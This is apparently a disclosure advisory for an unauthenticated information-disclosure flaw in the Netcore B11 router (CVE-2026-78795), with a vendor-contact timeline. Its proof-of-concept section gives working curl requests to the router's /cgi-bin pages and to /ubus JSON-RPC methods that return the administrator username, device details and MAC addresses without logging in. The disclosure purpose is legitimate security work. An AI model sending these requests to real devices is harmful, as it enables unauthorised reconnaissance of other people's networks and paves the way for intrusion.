# Netcore B11 Unauthenticated Sensitive Information Disclosure (CVE-2026-78795)

## Summary

An issue in Netcore B11 Enterprise-level full Gigabit 9-port shop wireless router v1.3.241114.024540 and before allows a remote attacker to obtain sensitive information.

If you are not logged in, you can directly return to the upgrade test page form, administrator user name, device model, firmware version, MAC, RID, network status, MAC and other information

## Affected Product
- Vendor: Netcore
- Product: Netcore B11 Enterprise-level Full Gigabit 9-Port Wireless Router
- Affected Versions: v1.3.241114.024540 and earlier

## POC
 Windows CMD execution:

A: GET /cgi-bin/upgrade and GET /cgi-bin/upgradeAP return to the upload form directly without logging in.
```
curl -i http://192.168.0.1/cgi-bin/upgrade
curl -i http://192.168.0.1/cgi-bin/upgradeAP
```

B: /ubus unauthenticated callable part routerd

Get administrator username
```
curl -s -H "Content-Type: application/json" -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"call\",\"params\":[\"00000000000000000000000000000000\",\"routerd\",\"login_name_get\",{}]}" http://192.168.0.1/ubus
```

Get device information anonymously
```
curl -s -H "Content-Type: application/json" -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"call\",\"params\":[\"00000000000000000000000000000000\",\"routerd\",\"app_info\",{}]}" http://192.168.0.1/ubus
```

C: /cgi-bin/clientinfo reveals visitor MAC:
```
curl -i http://192.168.0.1/cgi-bin/clientinfo
```

## Timeline
- 2026/5/7 - Vulnerability discovered during security testing of the Netcore B11 router.
- 2026/6/12 - Requests to MITRE for CVE.
- 2026/9/14 - Publicly disclosed after repeated attempts to contact the vendor received no response.
